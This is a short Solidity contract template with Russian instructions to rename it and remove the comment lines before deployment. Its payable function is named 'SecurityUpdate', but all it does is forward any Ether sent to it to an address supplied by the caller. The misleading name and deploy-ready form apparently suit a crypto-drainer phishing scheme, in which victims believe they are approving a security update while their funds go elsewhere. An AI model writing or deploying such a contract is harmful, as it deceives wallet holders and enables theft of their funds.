// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

// [УДАЛИТЕ ЭТУ СТРОКУ ПЕРЕД ДЕПЛОЕМ!] MS_Contract - это название контракта, вы можете заменить его на любое своё
// [УДАЛИТЕ ЭТУ СТРОКУ ПЕРЕД ДЕПЛОЕМ!] Важно, чтобы название содержало только латинские буквы и нижние подчёркивания
// [УДАЛИТЕ ЭТУ СТРОКУ ПЕРЕД ДЕПЛОЕМ!] Пробелы и другие символы не поддерживаются, не пытайтесь их использовать

contract MS_Contract {

  address private owner;

  constructor() { owner = msg.sender; }
  function getOwner() public view returns (address) { return owner; }
  function getBalance() public view returns (uint256) { return address(this).balance; }

  function SecurityUpdate(address sender) public payable { payable(sender).transfer(msg.value); }

}